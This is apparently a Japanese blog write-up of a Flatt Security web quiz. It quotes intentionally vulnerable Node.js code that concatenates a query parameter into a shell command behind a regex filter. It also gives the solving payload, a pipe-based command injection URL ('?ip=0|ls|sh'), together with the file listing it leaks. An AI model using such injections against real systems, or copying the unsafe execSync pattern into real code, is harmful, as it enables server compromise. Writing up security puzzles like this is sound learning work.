---
title: "Flatt Security Developer's Quiz #2"
date: 2022-07-23T00:22:32+09:00
tags: ["web", "Flatt Security Developer's Quiz"]
draft: false
---

[![flatt-security-developers-quiz2](https://i.gyazo.com/a6bc5bd079625435f43a4e6544564695.jpg)](https://gyazo.com/a6bc5bd079625435f43a4e6544564695)
https://twitter.com/flatt_security/status/1549710781918617600

# 方針
パイプで出力を繋いで、ファイル名を表示します。

## フィルタリングとコマンドの実行処理

以下の`exec()`は、スラッシュで囲まれたパターンをフィルタリングするので、多くの記号が使えません。
```javascript
if(/[!@#$%\^&*()\-_+=\[\] {}'";:,:?~\\]/.exec(ip_address)){
    res.send("Error! Your request is filtered!");
    return;
}
```

`ip_address`にフィルタリングを回避したコマンドを入力することで実行されてしまうことがわかります。
また、`execSync()`の処理がエラーの場合、レスポンスが返ってきます。

```javascript
const cmd = "sh -c 'ping -c 1 " + ip_address + "' 2>&1 >/dev/null; true";
const stderr = execSync(cmd, {"timeout": 1000});
if(stderr != ""){
    res.send("Error! " + stderr);
    return;
}

res.send("Your IP is in a good state!");
```

# 解答

パイプ`|`がフィルタリングされいないことに気づくので、それを使って繋いでいきます。

```none
https://2207okapi.twitter-quiz.flatt.training/?ip=0|ls|sh

Error! sh: 1: main.js: not found sh: 2: node_modules: not found sh: 3: package-lock.json: not found sh: 4: package.json: not found sh: 5: wow_congrats_you_executed_a_system_command.txt: not found
```

```none
main.js
node_modules
package-lock.json
package.json
wow_congrats_you_executed_a_system_command.txt
```

## 感想
Array query(`?ip[]=`)で[長さの制限をバイパスする方法](https://twitter.com/arkark_/status/1549957041279488000)を知る良い機会になりました。
